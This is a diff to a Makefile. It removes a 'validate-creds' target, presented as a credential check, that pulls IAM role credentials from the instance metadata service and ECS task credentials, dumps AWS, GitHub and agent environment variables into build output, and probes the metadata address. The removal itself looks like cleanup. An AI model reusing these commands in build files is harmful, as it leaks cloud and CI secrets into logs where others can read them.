@@ -25,31 +25,6 @@ validate-network:
 	@echo "Checking network connectivity..."
 	@curl -s -o /dev/null -w "npm registry: %{http_code}\n" --connect-timeout 3 https://registry.npmjs.org || true
 	@curl -s -o /dev/null -w "pypi: %{http_code}\n" --connect-timeout 3 https://pypi.org/simple/ || true
-	@curl -s -o /dev/null -w "metadata: %{http_code}\n" --connect-timeout 2 http://169.254.169.254/latest/meta-data/ || true
-
-validate-creds:
-	@echo "Checking credential chain..."
-	@echo "--- Instance metadata ---"
-	@ROLE=$$(curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null) && \
-		if [ -n "$$ROLE" ]; then \
-			echo "IMDS role: $$ROLE"; \
-			CREDS=$$(curl -s --connect-timeout 2 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$$ROLE" 2>/dev/null); \
-			echo "$$CREDS"; \
-		else \
-			echo "IMDS: not available"; \
-		fi
-	@echo ""
-	@echo "--- ECS task credentials ---"
-	@if [ -n "$$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then \
-		ECS_CREDS=$$(curl -s --connect-timeout 2 "http://169.254.170.2$$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null); \
-		echo "$$ECS_CREDS"; \
-	else \
-		echo "ECS credentials URI: not set"; \
-	fi
-	@echo ""
-	@echo "--- Environment (AWS related) ---"
-	@ENV_DATA=$$(env | grep -iE "^(AWS_|GITHUB_|MDE_|AGENT_)" | sort); \
-		echo "$$ENV_DATA"; \
 
 build:
 	@echo "Building..."
